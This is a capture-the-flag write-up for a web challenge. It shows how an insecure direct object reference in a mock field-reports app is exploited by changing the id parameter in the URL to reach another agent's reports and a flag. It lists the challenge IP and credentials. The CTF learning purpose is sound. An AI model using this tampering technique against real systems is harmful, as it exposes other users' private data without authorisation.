**Category:** Web Security  
**Points:** 150  
**Type:** Insecure Direct Object Reference (IDOR)

---

### 🎯 Objective
Gain access to the Supreme Leader’s secret pizza discount code hidden within the Juche Jaguar Field Reports web application.

---

### 🛠️ Tools & Techniques Used
- Web browser (manual exploration)
- IDOR (Insecure Direct Object Reference) exploitation
- Leetspeak logic
- URL tampering

---

### 🔍 Step-by-Step Exploit

#### Step 1: Initial Access
Logged in to the portal at:
```
http://35.245.106.190/login.html
```
with the provided weak credentials:
```
Username: 1234
Password: spudpotato
```

#### Step 2: Viewing Accessible Reports
Once logged in as Agent 1234, the user sees five reports:
```
UV12WX, YZ34AB, CD56EF, GH78IJ, KL90MN
```
Each is loaded using a URL like:
```
http://35.245.106.190/dashboard.php?id=1234&code=UV12WX
```

#### Step 3: Identifying the IDOR Attack Vector
Noticed the URL includes `id` and `code` parameters, suggesting direct object references that could be manipulated:
```
?id=1234&code=UV12WX
```
Tried guessing report codes like:
```
code=PZZA69
```
but these defaulted back to valid reports.

#### Step 4: Interpreting the "leet agent" Hint
A challenge hint said:
> "That 'leet' agent probably has a leetspeak ID."

Tried:
```
id=1337
```
Success! Agent 1337’s codename was EliteSpud — confirmed we accessed another agent’s data via IDOR.

#### Step 5: Manual Brute-Force of Reports
Agent 1337 had the following reports:
```
YZ12AB, CD34EF, GH56IJ, KL78MN, OP90QR
```
Checked them manually by visiting:
```
http://35.245.106.190/dashboard.php?id=1337&code=<code>
```
Example:
```
http://35.245.106.190/dashboard.php?id=1337&code=CD34EF
```

#### Step 6: Success in GH56IJ
While inspecting GH56IJ, found the target data:
```
"I extracted the Supreme Leader’s secret pizza-order discount code:
C1{ID0R_F13LD_R3P0RT}"
```

---

### 🏁 Flag
```
C1{ID0R_F13LD_R3P0RT}
```

---

### 📝 Takeaways
- IDOR vulnerabilities are often present in apps with parameterized access control.
- Manual testing can be very effective when parameters are predictable.
- Leetspeak hints are often literal in CTFs — always try numeric substitution!
